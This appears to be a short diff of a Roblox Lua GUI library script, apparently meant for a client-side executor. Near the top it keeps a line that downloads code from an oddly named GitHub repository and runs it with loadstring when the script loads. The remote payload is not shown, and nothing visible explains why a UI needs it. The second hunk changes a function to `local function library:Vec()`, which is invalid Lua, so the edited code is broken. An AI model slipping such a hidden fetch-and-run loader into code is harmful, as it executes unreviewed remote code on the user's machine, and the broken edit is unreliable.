@@ -7,7 +7,7 @@ local RunService = game:GetService("RunService")
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 local GuiService = game:GetService("GuiService")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SSDAWGDFHTEHVFFSGXCVBSDFBFDGWGSDVDDSXC/d/main/perpid"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SSDAWGDFHTEHVFFSGXCVBSDFBFDGWGSDVDDSXC/d/main/perpid"))() 
 function Vec(text)
 	local Notification = require(game.ReplicatedStorage.Notification)
 	local notification = Notification.new(text)
@@ -377,7 +377,7 @@ function library:Destroy()
 end
 
 
-local function libraryVec()
+local function library:Vec()
 	local Main = Instance.new("Frame")
 	local UICorner = Instance.new("UICorner")
 	local Top = Instance.new("Frame")
